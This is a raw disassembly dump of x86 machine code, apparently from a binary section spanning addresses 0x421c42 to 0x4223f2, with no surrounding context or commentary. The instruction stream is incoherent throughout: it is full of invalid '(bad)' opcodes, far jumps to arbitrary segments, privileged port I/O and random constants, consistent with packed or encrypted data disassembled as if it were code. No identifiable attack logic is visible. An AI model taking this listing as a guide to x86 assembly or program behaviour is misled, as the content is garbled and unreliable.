  421c42:	mov    esi,?
  421c44:	xchg   edx,eax
  421c45:	adc    BYTE PTR [esi],al
  421c47:	inc    edx
  421c48:	sbb    BYTE PTR [edi],ah
  421c4a:	aas    
  421c4b:	and    cl,dl
  421c4d:	xchg   BYTE PTR [ecx-0x76615289],ch
  421c53:	xor    edx,DWORD PTR [ecx]
  421c55:	push   eax
  421c56:	xor    al,0x2b
  421c58:	inc    edi
  421c59:	loopne 0x421c5f
  421c5b:	push   ecx
  421c5c:	rcl    bh,1
  421c5e:	pop    eax
  421c5f:	add    edx,DWORD PTR [ebp-0x15fc0990]
  421c65:	adc    eax,0xbc230570
  421c6a:	aam    0xcb
  421c6c:	arpl   WORD PTR [ebp-0x812a5f7],di
  421c72:	stos   DWORD PTR es:[edi],eax
  421c73:	sbb    al,0x18
  421c75:	out    0xff,al
  421c77:	retf   0x6795
  421c7a:	xchg   edx,eax
  421c7b:	je     0x421cee
  421c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c7e:	adc    DWORD PTR [ebp-0x64],edx
  421c81:	dec    edi
  421c82:	pop    eax
  421c83:	xor    BYTE PTR [ebx-0x10b4d4c],al
  421c89:	add    ecx,ebx
  421c8b:	cmp    ah,BYTE PTR [edx]
  421c8d:	cmp    esi,DWORD PTR [eax]
  421c8f:	stos   BYTE PTR es:[edi],al
  421c90:	jecxz  0x421c85
  421c92:	adc    edi,esp
  421c94:	xchg   ebx,eax
  421c95:	daa    
  421c96:	pop    ds
  421c97:	fstp   st(3)
  421c99:	fmulp  st(5),st
  421c9b:	sbb    edi,ecx
  421c9d:	retf   0x31e8
  421ca0:	in     al,0x8d
  421ca2:	ja     0x421d09
  421ca4:	or     DWORD PTR [ecx],ecx
  421ca6:	ret    0x8b9f
  421ca9:	gs dec eax
  421cab:	adc    BYTE PTR [esp+edi*8-0x7d],0xe6
  421cb0:	mov    dl,0xe1
  421cb2:	mov    ah,0x16
  421cb4:	jnp    0x421d1f
  421cb6:	mov    ds:0xc73fca4c,eax
  421cbb:	daa    
  421cbc:	sahf   
  421cbd:	icebp  
  421cbe:	fild   QWORD PTR gs:[ebx-0x53]
  421cc2:	mov    al,0x36
  421cc4:	and    ebx,DWORD PTR [esp+edi*8+0x74259fbe]
  421ccb:	(bad)  
  421ccd:	pusha  
  421cce:	push   0x31
  421cd0:	mov    cl,0x2b
  421cd2:	xor    BYTE PTR [eax-0x76],ah
  421cd5:	repnz cwde 
  421cd7:	data16 jp 0x421ce7
  421cda:	xchg   edx,eax
  421cdb:	popa   
  421cdc:	dec    ebp
  421cdd:	xor    dh,bh
  421cdf:	xor    ebp,esi
  421ce1:	imul   eax,DWORD PTR [edx-0x31aeab3e],0x20872b13
  421ceb:	repz add esi,DWORD PTR [ecx-0x3364401]
  421cf2:	xchg   esp,eax
  421cf3:	data16 int3 
  421cf5:	cli    
  421cf6:	fdiv   DWORD PTR [ecx+0x2bf511be]
  421cfc:	in     al,0x19
  421cfe:	mov    ds:0xe402acc2,al
  421d03:	rcl    DWORD PTR [eax],0x26
  421d06:	xor    al,0xda
  421d08:	adc    BYTE PTR [ecx],bh
  421d0a:	jp     0x421ccf
  421d0c:	shl    DWORD PTR [ebx],0x7b
  421d0f:	test   bh,bl
  421d11:	jmp    0x1178ef2f
  421d16:	push   esp
  421d17:	sub    DWORD PTR [ecx-0x570fb4fa],edx
  421d1d:	fmul   QWORD PTR [edi]
  421d1f:	xchg   ebp,eax
  421d20:	sbb    al,0x9b
  421d22:	and    edx,eax
  421d24:	or     esp,DWORD PTR [edi+0x72]
  421d27:	(bad)  
  421d28:	xor    dh,BYTE PTR [eax]
  421d2a:	or     ebx,DWORD PTR [ebp+0x5049fbb9]
  421d30:	xor    al,0xbb
  421d32:	test   eax,0x5fcc1fa1
  421d37:	popf   
  421d38:	add    BYTE PTR [edx],ch
  421d3a:	or     esp,esp
  421d3c:	inc    edx
  421d3d:	jb     0x421d30
  421d3f:	mov    al,0xf1
  421d41:	or     bl,bl
  421d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d44:	xchg   ebx,eax
  421d45:	inc    esp
  421d46:	icebp  
  421d47:	cmp    al,0x75
  421d49:	pop    ds
  421d4a:	add    esp,edx
  421d4c:	inc    edx
  421d4d:	iret   
  421d4e:	(bad)  
  421d4f:	xor    eax,0xb51eaeec
  421d54:	rcl    DWORD PTR [ebx],0x58
  421d57:	gs es jmp 0x1d445bb7
  421d5e:	imul   BYTE PTR [edi]
  421d60:	call   0x99a6:0xf386bc4a
  421d67:	js     0x421dca
  421d69:	aas    
  421d6a:	sub    BYTE PTR [esi-0x4b2e3f19],al
  421d70:	push   es
  421d71:	or     BYTE PTR [ebx],ah
  421d73:	or     ebx,DWORD PTR [eax]
  421d75:	ja     0x421dc3
  421d77:	or     al,0x60
  421d79:	into   
  421d7a:	pop    ds
  421d7b:	xor    al,0x36
  421d7d:	test   eax,0xa4175b83
  421d82:	adc    DWORD PTR [edi-0x5c],0xffffff90
  421d86:	test   DWORD PTR [edi-0x12],ebp
  421d89:	dec    edx
  421d8a:	stos   DWORD PTR es:[edi],eax
  421d8b:	(bad)  [edx]
  421d8d:	popa   
  421d8e:	inc    edx
  421d8f:	jg     0x421dc5
  421d91:	std    
  421d92:	rol    ch,cl
  421d94:	or     edi,ecx
  421d96:	and    eax,0x86cef591
  421d9b:	add    edi,DWORD PTR [ebp-0x27e1e50c]
  421da1:	or     al,0xb7
  421da3:	retf   
  421da4:	pusha  
  421da5:	or     eax,0x7fd0d44b
  421daa:	xor    eax,0xc0680992
  421daf:	add    al,0x4
  421db1:	push   esi
  421db2:	xchg   esi,eax
  421db3:	sub    BYTE PTR [edx],0x7b
  421db6:	mov    ch,0xf1
  421db8:	jns    0x421d64
  421dba:	inc    edx
  421dbb:	retf   
  421dbc:	adc    DWORD PTR [ebx+0x5],esi
  421dbf:	pushf  
  421dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc1:	shr    DWORD PTR [eax-0x7e59cf35],0x8f
  421dc8:	das    
  421dc9:	xchg   esp,eax
  421dca:	int    0xb
  421dcc:	ret    0xb9a5
  421dcf:	adc    BYTE PTR [edi+0x3c9ca05a],bh
  421dd5:	add    bl,cl
  421dd7:	push   eax
  421dd8:	ds pop ebp
  421dda:	xor    DWORD PTR [eax],eax
  421ddc:	out    dx,eax
  421ddd:	sar    dl,cl
  421ddf:	shl    BYTE PTR [edx+0x78],cl
  421de2:	adc    BYTE PTR [esi-0x18],al
  421de5:	cld    
  421de6:	(bad)  [esi+0x4]
  421de9:	mov    edx,0x4a925a6d
  421dee:	mov    WORD PTR [eax],es
  421df0:	fistp  QWORD PTR [edi]
  421df2:	or     eax,0xc8d6da4e
  421df7:	xor    DWORD PTR [edx-0x64],edi
  421dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dfb:	popaw  
  421dfd:	xchg   ebp,eax
  421dfe:	adc    eax,DWORD PTR [esi+esi*2+0x60c85f01]
  421e05:	cmc    
  421e06:	fisub  WORD PTR [ecx+0x2ad6d6c4]
  421e0c:	cwde   
  421e0d:	or     eax,0xd552e301
  421e12:	adc    BYTE PTR [ebx+0x5d],ah
  421e15:	idiv   BYTE PTR [ebx]
  421e17:	mov    esp,0x22f759a2
  421e1c:	dec    ecx
  421e1e:	call   0xb5c83e6e
  421e23:	sub    eax,0xc1ccaf4c
  421e28:	adc    eax,0x75597e07
  421e2d:	xor    al,0xaa
  421e2f:	xchg   edx,eax
  421e30:	scas   eax,DWORD PTR es:[edi]
  421e31:	adc    DWORD PTR [ecx],eax
  421e33:	jno    0x421e6f
  421e35:	scas   eax,DWORD PTR es:[edi]
  421e36:	neg    BYTE PTR [edx-0x48efbec0]
  421e3c:	sti    
  421e3d:	bound  ebp,QWORD PTR [edx-0x3780b072]
  421e43:	dec    ebp
  421e44:	nop
  421e45:	and    BYTE PTR [ecx+0x73],0x2b
  421e49:	fucom  st(7)
  421e4b:	or     dh,ch
  421e4d:	mov    edi,0x476cfbb9
  421e52:	adc    al,0x36
  421e54:	pushf  
  421e55:	scas   eax,DWORD PTR es:[edi]
  421e56:	xor    BYTE PTR ds:0xc137371d,dh
  421e5c:	leave  
  421e5d:	lahf   
  421e5e:	adc    eax,0x2b3923b7
  421e63:	test   al,0x43
  421e65:	out    0x42,eax
  421e67:	sbb    eax,0x35c0963d
  421e6c:	iret   
  421e6d:	gs push eax
  421e6f:	add    ecx,eax
  421e71:	neg    BYTE PTR [edi]
  421e73:	and    eax,0xa891a010
  421e78:	dec    ebx
  421e79:	push   0xffffffbc
  421e7b:	mov    dh,bl
  421e7d:	mov    edi,0xc7cf824
  421e82:	leave  
  421e83:	jl     0x421ec3
  421e85:	jo     0x421e56
  421e87:	mov    eax,ds:0x23059481
  421e8c:	shr    DWORD PTR [edi+ebx*8],0xbe
  421e90:	mov    bh,ch
  421e92:	adc    WORD PTR ds:0x995d0ac4,bx
  421e99:	ds jno 0x421ed1
  421e9c:	test   eax,0x42b141b4
  421ea1:	fld    TBYTE PTR ds:0x3e180b48
  421ea7:	sub    al,BYTE PTR [edx+ebp*1]
  421eaa:	sbb    BYTE PTR [esi],dh
  421eac:	stc    
  421ead:	pusha  
  421eae:	xchg   edx,eax
  421eaf:	mov    ch,0x4b
  421eb1:	loop   0x421e90
  421eb3:	sub    bl,0xd7
  421eb6:	mov    ah,bl
  421eb8:	les    eax,FWORD PTR [edx+0x19]
  421ebb:	add    edx,DWORD PTR ds:0x2a15aa51
  421ec1:	jmp    0x32e:0x3407f97c
  421ec8:	cld    
  421ec9:	sub    bl,bl
  421ecb:	je     0x421f4b
  421ecd:	inc    edi
  421ece:	ss test ebp,edi
  421ed1:	enter  0x799,0x16
  421ed5:	jo     0x421f26
  421ed7:	aaa    
  421ed8:	mov    ds:0x890d6af8,eax
  421edd:	test   al,0x5f
  421edf:	jl     0x421f40
  421ee1:	cli    
  421ee2:	nop
  421ee3:	repz (bad) 
  421ee5:	jmp    0x7be6:0x50c18922
  421eec:	dec    esi
  421eed:	std    
  421eee:	mov    al,ds:0x67203c08
  421ef3:	add    al,0xe
  421ef5:	imul   DWORD PTR [esi-0x5c]
  421ef8:	call   0x2481:0xab50d1b0
  421eff:	dec    ecx
  421f00:	add    eax,0xc9bb6bc2
  421f05:	push   esi
  421f06:	cmc    
  421f07:	repnz inc ecx
  421f09:	outs   dx,DWORD PTR ds:[esi]
  421f0a:	stc    
  421f0b:	lods   eax,DWORD PTR ds:[esi]
  421f0c:	fisttp DWORD PTR [ecx+0x18]
  421f0f:	(bad)  
  421f10:	jns    0x421f57
  421f12:	rcr    BYTE PTR [esi],0xf9
  421f15:	mov    eax,0xd5289eb
  421f1a:	data16 sub BYTE PTR [ebp+0xd068e7],al
  421f21:	hlt    
  421f22:	(bad)  [edx-0x54]
  421f25:	inc    ebx
  421f26:	mov    eax,ds:0x812d243f
  421f2b:	sub    bh,BYTE PTR ds:0x901a60a5
  421f31:	xor    DWORD PTR [ecx],ebp
  421f33:	jbe    0x421f16
  421f35:	frstor [ebp+0x74]
  421f38:	sar    DWORD PTR [edi],1
  421f3a:	jbe    0x421fad
  421f3c:	sub    ecx,DWORD PTR [esi+0x1d968607]
  421f42:	inc    ebx
  421f43:	cmp    DWORD PTR [ecx],esp
  421f45:	fwait
  421f46:	or     al,0xca
  421f48:	pop    eax
  421f49:	lea    esp,[edx+0x53]
  421f4c:	and    DWORD PTR [ebx],ecx
  421f4e:	jae    0x421f56
  421f50:	jmp    FWORD PTR [ebx]
  421f52:	jno    0x421f6d
  421f54:	out    0xb9,al
  421f56:	fist   WORD PTR [ebp-0x21]
  421f59:	fstp   TBYTE PTR [ebx-0x6f]
  421f5c:	mov    edi,0x7ce1def2
  421f61:	sbb    DWORD PTR [esi+0x71],ebp
  421f64:	push   ss
  421f65:	hlt    
  421f66:	jmp    0x421fa0
  421f68:	outs   dx,DWORD PTR ds:[esi]
  421f69:	or     DWORD PTR [esi+0x3c502f44],esp
  421f6f:	mov    ah,BYTE PTR [esi+0x34]
  421f72:	lahf   
  421f73:	pusha  
  421f74:	(bad)  
  421f75:	icebp  
  421f76:	add    bh,BYTE PTR [ebx-0x3926f00c]
  421f7c:	adc    ah,BYTE PTR [edx-0x5a54f976]
  421f82:	scas   al,BYTE PTR es:[edi]
  421f83:	in     eax,dx
  421f84:	fnsave [ecx-0xe]
  421f87:	dec    ebx
  421f88:	push   esi
  421f89:	adc    DWORD PTR [edi-0x4c34420a],0xebbcd89e
  421f93:	adc    ebx,edi
  421f95:	jno    0x421f77
  421f97:	dec    ecx
  421f98:	jbe    0x421f3d
  421f9a:	aas    
  421f9b:	(bad)
  421f9e:	(bad)  
  421f9f:	jmp    0x20f1:0x2ced004
  421fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fa7:	(bad)  [ecx+0x6a]
  421faa:	out    dx,eax
  421fab:	retf   
  421fac:	cmp    eax,0x5bb50684
  421fb1:	out    0x28,eax
  421fb3:	pop    ebx
  421fb4:	fcmovb st,st(1)
  421fb6:	fimul  DWORD PTR [ebp+0x30dea09e]
  421fbc:	cmc    
  421fbd:	shl    DWORD PTR [esi],0x6e
  421fc0:	sub    bh,ah
  421fc2:	sahf   
  421fc3:	jb     0x421f4f
  421fc5:	and    dh,bl
  421fc7:	mov    ah,0x85
  421fc9:	pop    ds
  421fca:	or     ebx,DWORD PTR [eax+0x27]
  421fcd:	js     0x421f70
  421fcf:	lock mov BYTE PTR [ebp+0x44c44ec1],bh
  421fd6:	hlt    
  421fd7:	cmp    ebx,DWORD PTR [ebx]
  421fd9:	inc    ebx
  421fda:	mov    bh,0xdc
  421fdc:	or     BYTE PTR [edx-0x3b6f695d],bh
  421fe2:	xor    ah,BYTE PTR [esi-0x55969779]
  421fe8:	shl    esi,0x72
  421feb:	adc    esi,eax
  421fed:	(bad)  
  421fee:	jmp    0x211f:0x15e265d
  421ff5:	arpl   sp,sp
  421ff7:	fidivr DWORD PTR [edx-0x75]
  421ffa:	daa    
  421ffb:	in     al,dx
  421ffc:	pop    esi
  421ffd:	or     al,dl
  421fff:	lea    edi,[eax-0x3c]
  422002:	iret   
  422003:	ins    BYTE PTR es:[edi],dx
  422004:	xchg   esi,eax
  422005:	aad    0xa0
  422007:	aad    0x79
  422009:	xchg   esi,eax
  42200a:	push   eax
  42200b:	not    BYTE PTR [ebp-0x21]
  42200e:	mov    ebx,0x40e75f55
  422014:	push   0x63
  422016:	mov    edx,0xc162e56d
  42201b:	dec    ebx
  42201c:	cwde   
  42201d:	xchg   esi,eax
  42201e:	lock das 
  422020:	cmp    BYTE PTR [edx+0x64],0xa1
  422024:	je     0x42204d
  422026:	pop    eax
  422027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422028:	lock test al,0x6
  42202b:	inc    BYTE PTR [edi]
  42202d:	cmp    eax,0x59cea519
  422032:	or     DWORD PTR [ebp+0x6],esi
  422035:	jmp    0x4eae6747
  42203a:	and    dl,BYTE PTR [ebx+ebp*4+0x16]
  42203e:	adc    al,0x24
  422040:	ins    DWORD PTR es:[edi],dx
  422041:	xchg   edi,eax
  422042:	and    al,0x84
  422044:	test   DWORD PTR [eax+0x2a],edi
  422047:	add    DWORD PTR [ebp+eiz*8-0xf],0x7e4ff01a
  42204f:	inc    ebx
  422050:	jmp    0xa0d7bf34
  422055:	push   ss
  422056:	xchg   edi,eax
  422057:	mov    bl,0xe5
  422059:	cmp    BYTE PTR [esi],dh
  42205b:	ins    DWORD PTR es:[edi],dx
  42205c:	xor    bh,ah
  42205e:	(bad)  
  42205f:	je     0x422057
  422061:	(bad)
  422065:	aam    0xd
  422067:	ss aad 0x70
  42206a:	or     al,0x81
  42206c:	push   ecx
  42206d:	push   ebx
  42206e:	clc    
  42206f:	dec    ebp
  422070:	mov    ebx,0x362e041
  422075:	jg     0x42203a
  422077:	ins    BYTE PTR es:[edi],dx
  422078:	sbb    bh,BYTE PTR [esi+0x68]
  42207b:	cwde   
  42207c:	pop    ecx
  42207d:	add    al,BYTE PTR [eax+0x71c14214]
  422083:	iret   
  422084:	mov    ecx,0xf5f0adf2
  422089:	cmp    DWORD PTR [ebp-0x7d],esp
  42208c:	fs or  al,0x94
  42208f:	push   esp
  422090:	sub    dh,BYTE PTR [esi+0x546998d8]
  422096:	test   al,0x21
  422098:	or     ebp,ecx
  42209a:	pop    esp
  42209b:	shr    BYTE PTR [edi-0x3189364d],1
  4220a1:	fstp   TBYTE PTR [ecx+0x57]
  4220a4:	and    ah,al
  4220a6:	and    bh,BYTE PTR [edx]
  4220a8:	xchg   ebp,eax
  4220a9:	rcl    BYTE PTR [esp+edi*2],0x4d
  4220ad:	jne    0x4220f6
  4220af:	pop    DWORD PTR [eax+0x9]
  4220b2:	cmp    eax,edx
  4220b4:	xchg   DWORD PTR [eax],esi
  4220b6:	inc    ecx
  4220b7:	test   eax,0x1f7cf70c
  4220bc:	or     ch,BYTE PTR [eax-0xe5b1d8f]
  4220c2:	retf   0xcb3e
  4220c5:	test   al,0xdc
  4220c7:	add    al,0xa3
  4220c9:	jbe    0x422059
  4220cb:	adc    dh,BYTE PTR [ebx-0x66]
  4220ce:	and    BYTE PTR [esi+0x6097a983],0x34
  4220d5:	pop    ecx
  4220d6:	pop    edx
  4220d7:	nop
  4220d8:	mov    ebp,0x5d29843b
  4220dd:	mov    dh,0x3e
  4220df:	inc    edx
  4220e0:	xor    dl,al
  4220e2:	retf   
  4220e3:	xchg   esi,eax
  4220e4:	jne    0x422144
  4220e6:	sti    
  4220e7:	push   0x19
  4220e9:	pop    ds
  4220ea:	inc    edi
  4220eb:	inc    esi
  4220ec:	sar    DWORD PTR [edi+0x1d],0xc9
  4220f0:	xchg   ebp,eax
  4220f1:	mov    ebx,0x30fa198d
  4220f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f7:	inc    ecx
  4220f8:	or     eax,0x50bc0634
  4220fd:	inc    esp
  4220fe:	jmp    0x4acd:0xdb4a76a1
  422105:	iret   
  422106:	xchg   esp,eax
  422107:	pop    ss
  422108:	xor    DWORD PTR [ebp+0x7b14216f],ebp
  42210e:	ror    DWORD PTR [ebp+eax*4-0x80],cl
  422112:	dec    ecx
  422113:	mov    ah,0xe4
  422115:	mov    ch,0x3c
  422117:	sbb    DWORD PTR [esi+0x5ef2ccb7],esi
  42211d:	or     DWORD PTR [eax+edx*8+0x47],ecx
  422121:	imul   esp,DWORD PTR [edi],0xffffff96
  422124:	(bad)  
  422125:	cli    
  422126:	mov    dl,0xf6
  422128:	hlt    
  422129:	(bad)  
  42212a:	shr    BYTE PTR [ecx+0x2cb2d5f4],cl
  422130:	jno    0x4221ae
  422132:	and    DWORD PTR [esi+0x5a],edx
  422135:	mov    ebx,0xc448bd1b
  42213a:	jle    0x422189
  42213c:	in     eax,0xa4
  42213e:	outs   dx,DWORD PTR ds:[esi]
  42213f:	cmc    
  422140:	sub    eax,edx
  422142:	(bad)  [edx+0x3b]
  422145:	daa    
  422146:	(bad)  
  422147:	xchg   esp,eax
  422148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422149:	xchg   edi,eax
  42214a:	int    0x90
  42214c:	pop    esp
  42214d:	jne    0x422112
  42214f:	mov    bh,0x0
  422151:	popa   
  422152:	inc    ebx
  422153:	je     0x4220fb
  422155:	push   ebx
  422156:	and    al,bl
  422158:	push   edi
  422159:	push   cs
  42215a:	jae    0x4221bc
  42215c:	xlat   BYTE PTR ds:[ebx]
  42215d:	scas   eax,DWORD PTR es:[edi]
  42215e:	pop    esp
  42215f:	jmp    0x2cae9c39
  422164:	enter  0x8173,0x63
  422168:	(bad)  
  422169:	lock out 0xba,al
  42216c:	jnp    0x422101
  42216e:	dec    edx
  42216f:	add    DWORD PTR [esi],ebx
  422171:	jne    0x4221e8
  422173:	pop    esi
  422174:	inc    ebp
  422175:	sub    al,BYTE PTR [eax+0x1c5077e9]
  42217b:	push   ebp
  42217c:	je     0x422175
  42217e:	adc    ebp,DWORD PTR [edi]
  422180:	mov    ebx,0xe6d19226
  422185:	enter  0xb4c8,0x6
  422189:	call   0xda03c76a
  42218e:	xlat   BYTE PTR ds:[ebx]
  42218f:	and    cl,BYTE PTR [ecx-0x59]
  422192:	push   eax
  422193:	sbb    DWORD PTR [eax+eax*8],esp
  422196:	outs   dx,BYTE PTR ds:[esi]
  422197:	ins    BYTE PTR es:[edi],dx
  422198:	jae    0x42219c
  42219a:	mov    eax,0x4405ee27
  42219f:	clc    
  4221a0:	push   ds
  4221a1:	jmp    0x6b11:0xcf7a3cea
  4221a8:	push   esi
  4221a9:	pop    es
  4221aa:	sbb    cl,dl
  4221ac:	(bad)  
  4221ad:	fnstsw WORD PTR ds:[edi]
  4221b0:	xor    eax,DWORD PTR [edi-0x5e6806e7]
  4221b6:	ja     0x422166
  4221b8:	pop    ds
  4221b9:	scas   al,BYTE PTR es:[edi]
  4221ba:	shl    BYTE PTR [edx],0x57
  4221bd:	adc    cl,BYTE PTR [ebx+eiz*1-0x4315181]
  4221c4:	push   eax
  4221c5:	loope  0x42222c
  4221c7:	hlt    
  4221c8:	iret   
  4221c9:	hlt    
  4221ca:	enter  0x4be7,0xc7
  4221ce:	pop    edi
  4221cf:	dec    esi
  4221d0:	and    ebp,DWORD PTR [esp+ebp*2+0x5b]
  4221d4:	pop    ds
  4221d5:	mov    eax,0xba7d0fd1
  4221da:	retf   0x3183
  4221dd:	mov    esp,eax
  4221df:	sub    esi,eax
  4221e1:	stos   BYTE PTR es:[edi],al
  4221e2:	fld1   
  4221e4:	pusha  
  4221e5:	push   ebx
  4221e6:	pop    DWORD PTR [ebx]
  4221e8:	repz sbb bh,BYTE PTR [ebx-0x1f]
  4221ec:	inc    edx
  4221ed:	ret    0xce83
  4221f0:	xlat   BYTE PTR ds:[ebx]
  4221f1:	fist   DWORD PTR [edx-0x7c04f700]
  4221f7:	xchg   esp,eax
  4221f8:	aaa    
  4221f9:	push   eax
  4221fa:	mov    ecx,0xc016d207
  4221ff:	pop    es
  422200:	pushfw 
  422202:	pop    edi
  422203:	sub    al,0x67
  422205:	imul   esp,DWORD PTR [ebp+ebx*8-0x49],0xf4896af6
  42220d:	add    ebx,esi
  42220f:	clc    
  422210:	ja     0x4221d6
  422212:	xchg   esp,eax
  422213:	ret    
  422214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422215:	adc    DWORD PTR [ebx],0x890daeac
  42221b:	das    
  42221c:	jbe    0x4221fc
  42221e:	inc    ecx
  42221f:	jl     0x4221a6
  422221:	ret    0x7588
  422224:	dec    esi
  422225:	and    edx,edx
  422227:	jg     0x4221ec
  422229:	ja     0x4222a7
  42222b:	jmp    0xc321:0x4a2aa5db
  422232:	and    ebp,DWORD PTR [edi+0x5f556c48]
  422238:	mov    ebx,edx
  42223a:	xor    bh,BYTE PTR [edi+0x9]
  42223d:	adc    cl,BYTE PTR [ebx+0x19]
  422240:	arpl   WORD PTR [ebp+edx*2-0x56],bp
  422244:	pop    ecx
  422245:	pop    eax
  422246:	pop    esp
  422247:	pop    edx
  422248:	sbb    eax,0x9330883a
  42224d:	shr    eax,1
  42224f:	add    DWORD PTR [edi-0x5386b6f7],0xb6e7d866
  422259:	ret    
  42225a:	je     0x4222ab
  42225c:	pop    es
  42225d:	jmp    0x4222a1
  42225f:	sti    
  422260:	cmp    DWORD PTR [edx-0x1a],0x47
  422264:	test   eax,0x547bbade
  422269:	sahf   
  42226a:	pop    edx
  42226b:	cmp    BYTE PTR [edx],0x48
  42226e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42226f:	stc    
  422270:	das    
  422271:	jg     0x4222c0
  422273:	sub    eax,0x71a7987c
  422278:	or     dl,BYTE PTR [esi]
  42227a:	(bad)  
  42227b:	adc    dh,BYTE PTR ss:[ebx+ebp*4]
  42227f:	inc    esp
  422280:	mov    esi,0x4868a146
  422285:	ss dec esi
  422287:	fisub  DWORD PTR [ebx+0x23]
  42228a:	xor    dl,dl
  42228c:	adc    al,0x5e
  42228e:	jle    0x422306
  422290:	xchg   BYTE PTR [edi+0x15],dl
  422293:	and    ah,BYTE PTR [edx]
  422295:	mov    ds:0xde206035,eax
  42229a:	lods   al,BYTE PTR ds:[esi]
  42229b:	push   0x1ed7924a
  4222a0:	and    BYTE PTR ds:0xb84d2390,ah
  4222a6:	pop    es
  4222a7:	add    bl,BYTE PTR [edi+0x8]
  4222aa:	jae    0x4222de
  4222ac:	xchg   ecx,eax
  4222ad:	jmp    0x158d:0x8eabb2b
  4222b4:	ret    
  4222b5:	ret    0x7ef6
  4222b8:	int    0xb0
  4222ba:	xor    edi,DWORD PTR [edx+0xd]
  4222bd:	or     al,0x1f
  4222bf:	sahf   
  4222c0:	out    dx,eax
  4222c1:	mov    ebx,0xfd848837
  4222c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c7:	xor    bl,dh
  4222c9:	mov    cl,0x5b
  4222cb:	mov    BYTE PTR [edx+0x1b],0x4d
  4222cf:	inc    eax
  4222d0:	dec    ebx
  4222d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222d2:	(bad)  
  4222d3:	mul    BYTE PTR [edi-0x716c3376]
  4222d9:	mov    ebp,0xabe17dfc
  4222de:	mov    bl,0x59
  4222e0:	ins    DWORD PTR es:[edi],dx
  4222e1:	fldcw  WORD PTR [edi-0x67]
  4222e4:	and    BYTE PTR [ebx+0x3f6f8d77],al
  4222ea:	cmp    ch,dh
  4222ec:	in     al,dx
  4222ed:	fs push ebx
  4222ef:	clc    
  4222f0:	adc    ah,BYTE PTR [edi-0x693821d2]
  4222f6:	mov    esi,0x8d0e7f59
  4222fb:	jns    0x4222de
  4222fd:	mov    al,ds:0x727120bd
  422302:	xor    esi,DWORD PTR [edx-0x2]
  422305:	lds    eax,FWORD PTR [ecx]
  422307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422308:	repnz add BYTE PTR ds:0xf55f967,bl
  42230f:	sbb    dl,BYTE PTR [ebp+0x5f]
  422312:	mov    al,0x94
  422314:	push   cs
  422315:	pop    es
  422316:	pusha  
  422317:	sbb    BYTE PTR [ebp+0x72],bh
  42231a:	xlat   BYTE PTR ds:[ebx]
  42231b:	or     eax,0xe9d4f334
  422320:	pop    esp
  422321:	inc    ebx
  422322:	mov    BYTE PTR [ebp-0x5e],0x7c
  422326:	push   ds
  422327:	inc    ebp
  422328:	outs   dx,BYTE PTR ds:[esi]
  422329:	dec    ebp
  42232a:	imul   ch
  42232c:	repz xchg edx,eax
  42232e:	jge    0x4222fc
  422330:	loope  0x422319
  422332:	sbb    al,dh
  422334:	int    0x80
  422336:	mov    bh,0xb
  422338:	mov    ecx,DWORD PTR [esi]
  42233a:	fs aam 0x8d
  42233d:	imul   ecx,DWORD PTR [esi+0x51],0x8e25fa4a
  422344:	inc    ebx
  422345:	dec    ecx
  422346:	inc    edi
  422347:	cli    
  422348:	or     BYTE PTR [eax-0x4b],cl
  42234b:	push   ebp
  42234c:	push   ebx
  42234d:	push   ss
  42234e:	xor    ch,BYTE PTR es:[ebx]
  422351:	pop    edi
  422352:	mov    BYTE PTR [edx-0x63],0xe2
  422356:	iret   
  422357:	push   ss
  422358:	les    edi,FWORD PTR [ecx-0x50]
  42235b:	cdq    
  42235c:	adc    ch,BYTE PTR [edi-0x65]
  42235f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422360:	das    
  422361:	cmp    bh,BYTE PTR [edx]
  422363:	adc    eax,DWORD PTR [ecx+0x58]
  422366:	ss jl  0x4223d0
  422369:	outs   dx,BYTE PTR ds:[esi]
  42236a:	or     eax,0xe18ba3b5
  42236f:	fidiv  WORD PTR ds:0x33543cb0
  422375:	add    eax,0x9ce3228c
  42237a:	xlat   BYTE PTR ds:[ebx]
  42237b:	push   0x1b
  42237d:	test   eax,0xadc2ec23
  422382:	fcom   QWORD PTR [edi-0x74ef0622]
  422388:	xor    al,BYTE PTR [ecx]
  42238a:	in     al,0x56
  42238c:	lock cld 
  42238e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42238f:	in     al,dx
  422390:	cwde   
  422391:	iret   
  422392:	(bad)  
  422393:	xor    esi,edx
  422395:	inc    eax
  422396:	pop    ds
  422397:	cmp    edi,DWORD PTR [esi-0x5b]
  42239a:	(bad)  
  42239c:	call   FWORD PTR [ebx-0xf9bc029]
  4223a2:	out    dx,eax
  4223a3:	lahf   
  4223a4:	into   
  4223a5:	jl     0x4223ea
  4223a7:	ins    BYTE PTR es:[edi],dx
  4223a8:	arpl   WORD PTR [esi+0x2f],sp
  4223ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ac:	add    al,cl
  4223ae:	adc    eax,0x6af9f52c
  4223b3:	mov    edx,0x33c3b72e
  4223b8:	adc    BYTE PTR [ebp-0x7162e04c],bl
  4223be:	pushf  
  4223bf:	sub    ebx,DWORD PTR [edx+ebx*4-0x202a968b]
  4223c6:	test   al,0xf8
  4223c8:	(bad)  
  4223c9:	sbb    DWORD PTR [ecx-0x674bc823],ebx
  4223cf:	jmp    0x2b0af4e1
  4223d4:	adc    al,0xcf
  4223d6:	test   bl,ah
  4223d8:	mul    DWORD PTR [ebp+0x4f6041fc]
  4223de:	in     eax,0xd7
  4223e0:	add    BYTE PTR [edx-0x39],0x7a
  4223e4:	in     eax,dx
  4223e5:	xor    eax,0xedcc6abf
  4223ea:	pop    ebx
  4223eb:	retf   
  4223ec:	add    ecx,DWORD PTR ds:0xcabd0a67
  4223f2:	pop    ds
